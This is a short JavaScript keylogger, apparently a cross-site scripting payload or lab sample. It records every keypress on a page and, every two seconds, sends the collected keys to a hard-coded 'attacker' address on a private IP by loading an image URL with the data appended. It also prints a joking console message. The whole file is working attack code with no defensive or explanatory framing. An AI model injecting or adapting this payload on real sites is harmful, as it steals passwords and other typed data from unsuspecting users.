var buffer = [];
var attacker = 'http://172.16.10.119:3399/?c=';

document.onkeypress = function(e) {
    var timestamp = Date.now() | 0;
    var stroke = {
        k: e.key,
        t: timestamp
    };
    buffer.push(e.key);
};

window.setInterval(function() {
    if (buffer.length > 0) {
        var data = encodeURIComponent(JSON.stringify(buffer));
        console.log('sending yo data foo:', attacker + data);
        new Image().src = attacker + data;
        buffer = [];
    }
}, 2000);